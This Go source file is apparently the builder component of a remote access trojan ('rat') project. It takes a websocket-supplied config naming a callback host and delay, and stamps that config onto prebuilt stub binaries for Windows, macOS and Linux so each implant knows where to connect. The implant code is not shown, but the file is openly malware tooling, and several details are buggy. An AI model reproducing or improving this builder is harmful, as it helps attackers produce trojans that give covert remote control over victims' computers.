package build

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"rat/common"
)

// BuildConfig is received from the websocket
type BuildConfig struct {
	TargetOS   string `json:"os"`
	TargetArch string `json:"arch"`
	Host       string `json:"host"`
	Delay      int    `json:"delay"`
}

func Build(c *BuildConfig, w io.Writer) error {
	fmt.Println("Starting build...")
	fmt.Println("Target OS:", c.TargetOS)
	fmt.Println("Target Arch:", c.TargetArch)
	fmt.Println(*c)

	var oss []string
	var archs []string

	if c.TargetOS == "all" {
		oss = []string{"windows", "macos", "linux"}
	} else {
		oss = []string{c.TargetOS}
	}

	if c.TargetArch == "all" {
		archs = []string{"amd64", "386"}
	} else {
		archs = []string{c.TargetArch}
	}

	config := common.BinaryConfig{
		Host:  c.Host,
		Delay: c.Delay,
	}

	fmt.Println("Encoded config:", config)

	encoded, err := json.Marshal(&config)
	if err != nil {
		return err
	}

	for _, ost := range oss {
		for _, arch := range archs {
			ext := ""
			if ost == "windows" {
				ext = ".exe"
			}

			temp, err := ioutil.TempFile("", "build")
			if err != nil {
				return err
			}

			fmt.Println(temp.Name())

			bin, err := os.OpenFile("bin/"+ost+"_"+arch+ext, os.O_RDONLY, 0777)
			defer bin.Close()
			if err != nil {
				return err
			}

			io.Copy(temp, bin)

			stat, err := bin.Stat()
			if err != nil {
				return err
			}

			offset := stat.Size() // int64
			fmt.Println("Offset:", offset)

			temp.Write(encoded)
			binary.Write(temp, common.ByteOrder, offset)

			temp.Close()
		}
	}

	w.Write([]byte("Build complete"))
	return nil
}
